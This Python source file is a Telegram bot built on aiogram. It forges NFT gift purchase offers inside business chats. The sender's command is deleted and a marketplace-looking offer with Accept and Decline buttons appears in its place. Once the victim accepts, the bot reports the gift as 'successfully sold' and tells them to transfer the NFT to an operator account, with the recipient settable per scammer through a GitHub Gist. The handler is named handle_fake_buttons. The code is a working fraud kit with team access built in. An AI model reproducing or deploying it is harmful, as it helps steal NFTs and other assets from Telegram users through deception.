import asyncio
import os
import re
import random
import string
import json
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.exceptions import TelegramBadRequest

# --- НАСТРОЙКИ ИЗ СЕКРЕТОВ GITHUB ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
GIST_ID = os.getenv("GIST_ID")
GIST_TOKEN = os.getenv("GIST_TOKEN")

try:
    ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
except ValueError:
    ADMIN_ID = 0

# --- ИЗМЕНЕН ТОЛЬКО ЮЗЕРНЕЙМ ЗДЕСЬ ---
DEFAULT_TARGET = "fakinwin"
# ------------------------------------

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_users = set()

MESSAGES = {
    "ru": {
        "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зачисления звёзд.",
        "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "btn_transfer": "Передать NFT"
    },
    "en": {
        "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/{target_username}'>@{target_username}</a> to receive stars.",
        "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "btn_transfer": "Transfer NFT"
    },
    "ua": {
        "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зарахування зірок.",
        "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
        "btn_accept": "Прийняти",
        "btn_decline": "Відхилити",
        "btn_transfer": "Передати NFT"
    },
    "ar": {
        "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/{target_username}'>@{target_username}</a> لاستلام النجوم.",
        "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
        "btn_accept": "قبول",
        "btn_decline": "رفض",
        "btn_transfer": "نقل NFT"
    }
}

def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

# --- РАБОТА С GIST (БАЗА ДАННЫХ) ---
async def get_gist_data():
    if not GIST_ID or not GIST_TOKEN:
        return None, "Ошибка: GIST_ID или GIST_TOKEN не заданы в Secrets!"
    
    headers = {"Authorization": f"token {GIST_TOKEN}"}
    url = f"https://api.github.com/gists/{GIST_ID}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    content = data['files'].get('config.json', {}).get('content', '{}')
                    return json.loads(content) if content else {}, None
                else:
                    error_text = await resp.text()
                    return None, f"GitHub вернул ошибку {resp.status}: {error_text}"
    except Exception as e:
        return None, f"Ошибка сети: {e}"

async def update_gist_data(new_data: dict):
    headers = {"Authorization": f"token {GIST_TOKEN}"}
    url = f"https://api.github.com/gists/{GIST_ID}"
    payload = {
        "files": {
            "config.json": {
                "content": json.dumps(new_data, indent=2)
            }
        }
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.patch(url, headers=headers, json=payload) as resp:
                if resp.status == 200:
                    return True, "Успех"
                else:
                    error_text = await resp.text()
                    return False, f"Ошибка {resp.status}: {error_text}"
    except Exception as e:
        return False, f"Ошибка сети: {e}"

# --- АДМИН ПАНЕЛЬ ---
@dp.message(Command("my_id"))
async def cmd_my_id(message: types.Message):
    await message.answer(f"Ваш ID: <code>{message.from_user.id}</code>\nID Админа в боте: <code>{ADMIN_ID}</code>", parse_mode="HTML")

@dp.message(Command("set_target"))
async def cmd_set_target(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.answer(
            f"❌ <b>Отказано в доступе.</b>\n\n"
            f"Ваш ID: <code>{message.from_user.id}</code>\n"
            f"Ожидается (ADMIN_ID): <code>{ADMIN_ID}</code>\n\n"
            f"Если вы админ, убедитесь, что в настройках GitHub Secrets добавлен правильный <code>ADMIN_ID</code>.",
            parse_mode="HTML"
        )
    
    parts = message.text.split()
    if len(parts) != 3:
        return await message.answer("❌ Формат: `/set_target @юзернейм новый_получатель`")
    
    user_key = parts[1].replace("@", "").lower()
    new_target = parts[2].replace("@", "")
    
    data, error = await get_gist_data()
    if error:
        return await message.answer(f"❌ Ошибка чтения базы:\n<code>{error}</code>", parse_mode="HTML")
    
    data[user_key] = new_target
    
    success, error_msg = await update_gist_data(data)
    if success:
        await message.answer(f"✅ Для `@{user_key}` установлен новый получатель: `@{new_target}`")
    else:
        await message.answer(f"❌ Ошибка сохранения:\n<code>{error_msg}</code>", parse_mode="HTML")

@dp.message(Command("remove_target"))
async def cmd_remove_target(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.answer(f"❌ Вы не админ. Ваш ID: {message.from_user.id}")
    
    parts = message.text.split()
    if len(parts) != 2:
        return await message.answer("❌ Формат: `/remove_target @юзернейм`")
    
    user_key = parts[1].replace("@", "").lower()
    data, error = await get_gist_data()
    if error:
        return await message.answer(f"❌ Ошибка чтения:\n<code>{error}</code>", parse_mode="HTML")
    
    if user_key in data:
        del data[user_key]
        if await update_gist_data(data):
            await message.answer(f"✅ Для `@{user_key}` сброшен на @{DEFAULT_TARGET}")
        else:
            await message.answer("❌ Ошибка сохранения.")
    else:
        await message.answer("❌ Пользователь не найден в базе.")

@dp.message(Command("test_db"))
async def cmd_test_db(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.answer(f"❌ Вы не админ. Ваш ID: {message.from_user.id}")
    
    data, error = await get_gist_data()
    if error:
        return await message.answer(f"❌ Ошибка чтения:\n<code>{error}</code>", parse_mode="HTML")
    
    pretty_json = json.dumps(data, indent=2, ensure_ascii=False)
    await message.answer(f"<b>База данных (Gist):</b>\n<pre><code>{pretty_json}</code></pre>", parse_mode="HTML")

# --- ОСНОВНЫЕ КОМАНДЫ ---
@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    text = (
        "<b>Как начать:</b>\n"
        "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
        "<b>Как создать оффер:</b>\n"
        "Отправь команду в деловой чат с покупателем:\n"
        "<code>/of ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
        "<b>Примеры:</b>\n"
        "<code>/of t.me/nft/DurovsCap-1234 500 stars</code>\n"
        "<code>/of t.me/nft/DurovsCap-1234 10 gram en</code>\n"
        "<code>/of t.me/nft/DurovsCap-1234 250 stars ua</code>\n\n"
        "<b>Валюты:</b> stars / gram\n"
        "<b>Языки:</b> ru / en / ua / ar"
    )
    await message.answer(text, parse_mode="HTML")

@dp.message(Command("ofteam"))
async def cmd_ofteam(message: types.Message):
    await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")

@dp.message(F.text.startswith("/of"))
async def block_offer_in_pm(message: types.Message):
    await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")

# --- ГЕНЕРАЦИЯ ОФФЕРА ---
@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    business_connection_id = message.business_connection_id
    if not business_connection_id: return

    parts = message.text.split()
    if len(parts) < 4: return

    link = parts[1]
    if not link.startswith("http"): link = "https://" + link
    try:
        amount = int(parts[2])
    except ValueError:
        return
    
    currency = parts[3].lower()
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    lang = parts[4].lower() if len(parts) > 4 else "ru"
    if lang not in MESSAGES: lang = "ru"

    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match: return
    
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    msg_data = MESSAGES[lang]

    caption_text = msg_data["offer"].format(
        username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name,
        target_username=DEFAULT_TARGET
    )

    sender_username = message.from_user.username.lower() if message.from_user.username else "no_username"

    try:
        await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}"),
            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}")
        ]])
        
        await bot.send_message(
            chat_id=message.chat.id,
            text=caption_text,
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
        )
    except Exception as e:
        print(f"Ошибка: {e}")

# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША ---
@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    if not callback.message: return
    
    data_parts = callback.data.split(":")
    action, gift_slug, amount, currency, lang, sender_username = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4], data_parts[5]
    
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    
    data, error = await get_gist_data()
    target_username = DEFAULT_TARGET
    if data and not error:
        target_username = data.get(sender_username, DEFAULT_TARGET)

    cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    link = f"https://t.me/nft/{gift_slug}?v={cache_buster}"
    
    pretty_name = get_pretty_name(gift_slug)
    business_connection_id = callback.message.business_connection_id
    msg_data = MESSAGES.get(lang, MESSAGES["ru"])

    if action == "accept":
        new_text = msg_data["success"].format(
            link=link, pretty_name=pretty_name, target_username=target_username
        )
        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{target_username}")]
        ])
        alert_text = (
            "⚠️ Внимание!\n\n"
            "Получатель в этом сервисе:\n"
            f"@{target_username}.\n\n"
            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
        )
    else:
        new_text = msg_data["declined"].format(
            amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=target_username
        )
        new_keyboard = None
        alert_text = None

    try:
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            text=new_text,
            reply_markup=new_keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
        )
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e).lower():
            print(f"Ошибка изменения: {e}")
    except Exception as e:
        print(f"Неизвестная ошибка: {e}")

    if alert_text:
        await callback.answer(alert_text, show_alert=True)
    else:
        await callback.answer()

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
